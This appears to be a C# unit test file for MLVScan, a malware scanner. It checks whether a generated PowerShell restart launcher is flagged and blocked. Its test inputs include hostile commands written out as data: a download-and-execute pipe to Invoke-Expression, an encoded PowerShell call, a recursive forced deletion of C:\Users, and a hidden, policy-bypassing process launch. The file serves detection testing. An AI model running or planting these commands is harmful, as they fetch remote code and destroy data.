using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.Rules.Helpers;
using MLVScan.Models.ThreatIntel;
using MLVScan.Services;
using MLVScan.Services.ThreatIntel;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Services;

public class RestartDispositionTests
{
    private const string Tail = " -ErrorAction SilentlyContinue; Start-Sleep -Seconds 5; Start-Process 'steam://run/12345'";

    [Fact]
    public void Scan_EncodedLauncher_ReportsUnderlyingCommand()
    {
        Scan(Tail).Should().Contain(f => f.RuleId == "ProcessStartRule" && f.Severity == Severity.Critical &&
            f.Description.Contains("Invoke-CimMethod") && f.Description.Contains("restart.ps1"));
    }

    [Fact]
    public void Scan_ConstrainedRestart_RetainsSuspicionWithoutBlocking()
    {
        var findings = Scan(Tail);
        findings.Should().Contain(f => f.RuleId == "ProcessStartRule" && f.Severity == Severity.Critical);
        var disposition = new ThreatDispositionClassifier().Classify(findings, null);
        disposition.Classification.Should().Be(MLVScan.Models.ThreatIntel.ThreatDispositionClassification.Suspicious);
        disposition.BlockingRecommended.Should().BeFalse();
    }

    [Theory]
    [InlineData("; Invoke-WebRequest https://example.invalid/payload | Invoke-Expression")]
    [InlineData("; Start-Process 'payload.exe'")]
    [InlineData("; & 'powershell.exe' '-enc' 'SQBFAFgA'")]
    [InlineData("; Remove-Item C:\\Users -Recurse -Force")]
    public void Scan_AdditionalScriptOperation_StillBlocks(string operation)
        => new ThreatDispositionClassifier().Classify(Scan(Tail + operation), null).BlockingRecommended.Should().BeTrue();

    [Theory]
    [InlineData("file:///payload.exe")]
    [InlineData("steam://run/12345//-some-argument")]
    [InlineData("steam://install/12345")]
    public void Scan_ChangedLaunchTarget_StillBlocks(string target)
        => new ThreatDispositionClassifier().Classify(Scan(Tail.Replace("steam://run/12345", target)), null)
            .BlockingRecommended.Should().BeTrue();

    [Fact]
    public void Classify_RestartAndIndependentCriticalFinding_StillBlocks()
    {
        var findings = Scan(Tail);
        findings.Add(new ScanFinding("OtherMethod", "Payload execution", Severity.Critical) { RuleId = "ProcessStartRule" });
        new ThreatDispositionClassifier().Classify(findings, null).BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_SameDisplayedLocationCannotBorrowRestartProof()
    {
        var findings = Scan(Tail);
        var restart = findings.Single(f => f.HasConstrainedRestartEvidence);
        findings.Add(new ScanFinding(restart.Location, "Another launch at a colliding overload location", Severity.Critical)
        {
            RuleId = "ProcessStartRule",
            SourceInstruction = Instruction.Create(OpCodes.Nop)
        });
        new ThreatDispositionClassifier().Classify(findings, null).BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_KnownFamilyTakesPrecedenceOverRestart()
    {
        var disposition = new ThreatDispositionClassifier().Classify(Scan(Tail),
            [new ThreatFamilyMatch { FamilyId = "malware", DisplayName = "Known malware", Confidence = 1 }]);
        disposition.Classification.Should().Be(ThreatDispositionClassification.KnownThreat);
        disposition.BlockingRecommended.Should().BeTrue();
    }

    [Theory]
    [InlineData("unbound-script")]
    [InlineData("unescaped-script")]
    [InlineData("encoded-suffix")]
    [InlineData("wrong-pid")]
    [InlineData("branch-around-write")]
    [InlineData("rewrite-script")]
    [InlineData("fake-framework")]
    [InlineData("forged-proof")]
    public void Scan_UnprovenBindings_StillBlocks(string mutation)
    {
        var findings = Scan(Tail, method =>
        {
            var il = method.Body.GetILProcessor();
            var instructions = method.Body.Instructions;
            var scriptPaths = instructions.Where(i => i.Operand is string s && s == "C:\\Data\\restart.ps1").ToArray();
            var write = instructions.Single(i => i.Operand is MethodReference { Name: "WriteAllText" });
            switch (mutation)
            {
                case "unbound-script": scriptPaths[1].Operand = "C:\\Data\\another.ps1"; break;
                case "unescaped-script":
                    var replace = instructions.Single(i => i.Operand is MethodReference { Name: "Replace" });
                    il.Remove(replace.Previous.Previous);
                    il.Remove(replace.Previous);
                    il.Remove(replace);
                    break;
                case "encoded-suffix":
                    instructions.Single(i => i.Operand is string s && s == "\"'} | Out-Null").Operand = "\"'} | Out-Null; Start-Process payload.exe";
                    break;
                case "wrong-pid":
                    var current = instructions.Single(i => i.Operand is MethodReference { Name: "GetCurrentProcess" });
                    il.InsertBefore(current, Instruction.Create(OpCodes.Ldc_I4, 123));
                    current.Operand = method.Module.ImportReference(typeof(System.Diagnostics.Process).GetMethod("GetProcessById", [typeof(int)])!);
                    break;
                case "branch-around-write":
                    il.InsertBefore(scriptPaths[0], Instruction.Create(OpCodes.Br, write.Next));
                    break;
                case "rewrite-script":
                    il.InsertAfter(write, Instruction.Create(OpCodes.Call, (MethodReference)write.Operand));
                    il.InsertAfter(write, Instruction.Create(OpCodes.Ldstr, "Start-Process payload.exe"));
                    il.InsertAfter(write, Instruction.Create(OpCodes.Ldstr, "C:\\Data\\restart.ps1"));
                    break;
                case "fake-framework":
                    var start = instructions.Single(i => i.Operand is MethodReference { Name: "Start" });
                    ((MethodReference)start.Operand).DeclaringType.Scope = method.Module;
                    break;
                case "forged-proof":
                    instructions.Single(i => i.Operand is string s && s == "Wait-Process -Id ").Operand =
                        "Wait-Process -Id " + RestartScriptPattern.CurrentPid;
                    break;
            }
        });
        new ThreatDispositionClassifier().Classify(findings, null).BlockingRecommended.Should().BeTrue();
    }

    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public void Classify_IncompleteRestartAnalysis_StillBlocks(bool reviewRecommended)
        => new ThreatDispositionClassifier().Classify(Scan(Tail), null,
            new AnalysisCompletenessResult { IsComplete = false, ReviewRecommended = reviewRecommended })
            .BlockingRecommended.Should().BeTrue();

    [Fact]
    public void Classify_RawIncompleteFindingWithoutCompletenessSummary_StillBlocks()
    {
        var findings = Scan(Tail);
        findings.Add(new ScanFinding("OtherMethod", "Analysis could not finish", Severity.Medium)
        {
            RuleId = "MethodScanWarning"
        });
        new ThreatDispositionClassifier().Classify(findings, null).BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Map_RestartAdvisory_PreservesRecommendationAndEvidence()
    {
        var dto = ScanResultMapper.ToDto(Scan(Tail), "RestartFixture.dll", [], false);
        dto.Disposition!.Classification.Should().Be("Suspicious");
        dto.Disposition.BlockingRecommended.Should().BeFalse();
        dto.Disposition.RelatedFindingIds.Should().HaveCountGreaterThanOrEqualTo(2);
    }

    [Theory]
    [InlineData("*.delete", true)]
    [InlineData("*", false)]
    [InlineData("*.dll", false)]
    [InlineData("*.delete -Recurse", false)]
    public void RestartGrammar_OnlyAllowsBoundedCleanup(string filter, bool expected)
    {
        var script = "Wait-Process -Id " + RestartScriptPattern.CurrentPid +
                     " -ErrorAction SilentlyContinue; Get-ChildItem -LiteralPath '" + RestartScriptPattern.DirectoryPath +
                     "' -Filter " + filter + " -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue; " +
                     "Start-Process 'steam://run/12345'";
        RestartScriptPattern.Matches(script).Should().Be(expected);
    }

    private static List<ScanFinding> Scan(string tail, Action<MethodDefinition>? mutate = null)
    {
        using var assembly = AssemblyDefinition.CreateAssembly(new AssemblyNameDefinition("RestartFixture", new Version(1, 0)), "RestartFixture", ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Fixture", "Launcher", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
        module.Types.Add(type);
        var method = new MethodDefinition("Launch", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        type.Methods.Add(method);
        var pid = new VariableDefinition(module.TypeSystem.Int32);
        var script = new VariableDefinition(module.TypeSystem.String);
        method.Body.Variables.Add(pid);
        method.Body.Variables.Add(script);
        method.Body.InitLocals = true;
        var il = method.Body.GetILProcessor();
        void Call(System.Reflection.MethodBase member, bool instance = false) => il.Emit(instance ? OpCodes.Callvirt : OpCodes.Call, module.ImportReference(member));
        Call(typeof(System.Diagnostics.Process).GetMethod("GetCurrentProcess")!);
        Call(typeof(System.Diagnostics.Process).GetProperty("Id")!.GetMethod!, true);
        il.Emit(OpCodes.Stloc, pid);
        il.Emit(OpCodes.Ldstr, "Wait-Process -Id ");
        il.Emit(OpCodes.Ldloca, pid);
        Call(typeof(int).GetMethod("ToString", Type.EmptyTypes)!);
        il.Emit(OpCodes.Ldstr, tail);
        Call(typeof(string).GetMethod("Concat", [typeof(string), typeof(string), typeof(string)])!);
        il.Emit(OpCodes.Stloc, script);
        il.Emit(OpCodes.Ldstr, "C:\\Data\\restart.ps1");
        il.Emit(OpCodes.Ldloc, script);
        Call(typeof(File).GetMethod("WriteAllText", [typeof(string), typeof(string)])!);
        il.Emit(OpCodes.Ldstr, "powershell.exe");
        il.Emit(OpCodes.Ldstr, "-NoProfile -WindowStyle Hidden -EncodedCommand ");
        Call(typeof(System.Text.Encoding).GetProperty("Unicode")!.GetMethod!);
        il.Emit(OpCodes.Ldstr, "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"");
        il.Emit(OpCodes.Ldstr, "C:\\Data\\restart.ps1");
        il.Emit(OpCodes.Ldstr, "'");
        il.Emit(OpCodes.Ldstr, "''");
        Call(typeof(string).GetMethod("Replace", [typeof(string), typeof(string)])!, true);
        il.Emit(OpCodes.Ldstr, "\"'} | Out-Null");
        Call(typeof(string).GetMethod("Concat", [typeof(string), typeof(string), typeof(string)])!);
        Call(typeof(System.Text.Encoding).GetMethod("GetBytes", [typeof(string)])!, true);
        Call(typeof(Convert).GetMethod("ToBase64String", [typeof(byte[])])!);
        Call(typeof(string).GetMethod("Concat", [typeof(string), typeof(string)])!);
        il.Emit(OpCodes.Newobj, module.ImportReference(typeof(System.Diagnostics.ProcessStartInfo).GetConstructor([typeof(string), typeof(string)])!));
        Call(typeof(System.Diagnostics.Process).GetMethod("Start", [typeof(System.Diagnostics.ProcessStartInfo)])!);
        il.Emit(OpCodes.Pop);
        il.Emit(OpCodes.Ret);
        mutate?.Invoke(method);
        using var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;
        return new AssemblyScanner(RuleFactory.CreateDefaultRules()).Scan(stream, "RestartFixture.dll").ToList();
    }
}
